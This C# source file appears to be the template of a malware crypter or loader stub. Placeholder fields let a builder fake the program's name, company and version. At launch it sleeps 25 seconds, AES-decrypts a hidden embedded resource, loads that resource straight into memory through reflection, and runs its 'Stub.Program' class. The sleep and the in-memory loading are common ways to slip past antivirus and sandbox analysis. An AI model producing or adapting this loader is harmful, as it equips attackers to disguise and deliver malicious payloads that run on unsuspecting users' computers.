using System;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Resources;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;

[assembly: AssemblyTitle("#AssemblyProduct")]
[assembly: AssemblyDescription("#AssemblyDescription")]
[assembly: AssemblyCompany("#AssemblyProduct")]
[assembly: AssemblyProduct("#AssemblyProduct")]
[assembly: AssemblyCopyright("#AssemblyCopyright")]
[assembly: AssemblyTrademark("#AssemblyTrademark")]
[assembly: AssemblyFileVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: AssemblyVersion("#AssemblyMajorVersion" + "." + "#AssemblyMinorVersion" + "." + "#AssemblyBuildPart" + "." + "#AssemblyPrivatePart")]
[assembly: Guid("#Guid")]
[assembly: ComVisible(false)]

namespace Loader
{
    public class Program
    {
        [STAThread]
        public static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Nyan());
        }
    }

    public interface INyan
    {
        void Initialize();
    }

    public interface INyan1
    {
        void Initialize();
    }

    public interface INyan2
    {
        void Initialize();
    }

    public interface INyan3
    {
        void Initialize();
    }

    public class Nyan : Form, INyan, INyan1, INyan2, INyan3
    {
        public Nyan()
        {
            Initialize();
        }

        public void Initialize()
        {
            Thread.Sleep(25 * 1000);
            Assembly myAssembly = AppDomain.CurrentDomain.Load(AES_Decrypt(GetResource("#Stub")));
            Type myType = myAssembly.GetType("Stub.Program");
            dynamic myObj = Activator.CreateInstance(myType);
            myObj.Run();
        }

        private static byte[] AES_Decrypt(byte[] bytesToBeDecrypted)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            using (Aes AES = Aes.Create())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Padding = PaddingMode.PKCS7;

                var passwordBytes = Encoding.UTF8.GetBytes("#AesKey");
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);
                AES.Mode = CipherMode.CBC;

                try
                {
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.FlushFinalBlock();

                        decryptedBytes = ms.ToArray();
                    }
                }
                catch (CryptographicException ex)
                {
                    throw new InvalidOperationException("Decryption failed", ex);
                }
            }

            return decryptedBytes;
        }

        private static byte[] GetResource(string file)
        {
            ResourceManager resManager = new ResourceManager("#ParentResource", Assembly.GetExecutingAssembly());
            return (byte[])resManager.GetObject(file);
        }
    }
}
